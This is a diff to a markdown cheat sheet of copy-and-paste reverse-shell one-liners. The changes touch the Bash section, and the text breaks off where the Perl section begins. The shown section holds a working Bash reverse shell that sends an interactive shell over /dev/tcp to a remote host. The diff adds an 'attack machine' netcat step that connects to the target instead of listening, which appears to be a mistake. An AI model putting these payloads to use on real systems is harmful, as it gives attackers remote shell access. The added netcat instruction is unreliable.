@@ -13,9 +13,14 @@ The examples shown are tailored to Unix-like systems.  Some of the examples belo
 Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they’re quite short lines, but not very readable.
 
 ## Bash
-Some versions of bash can send you a [reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash) / http://www.gnucitizen.org/blog/reverse-shell-with-bash (this was tested on Ubuntu 10.10):
+Some versions of bash can send you a [reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash) / http://www.gnucitizen.org/blog/reverse-shell-with-bash (this was tested on Ubuntu 10.10):  
+$${\color{green}On\ the\ target\ machine:}$$
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+$${\color{blue}Catch\ the\ shell\ on\ attack\ machine:}$$
+```bash
+nc -nv TARGET_IP 8080
 ```
 ## PERL
 Here’s a shorter, feature-free version of the [perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell) / http://pentestmonkey.net/tools/web-shells/perl-reverse-shell:
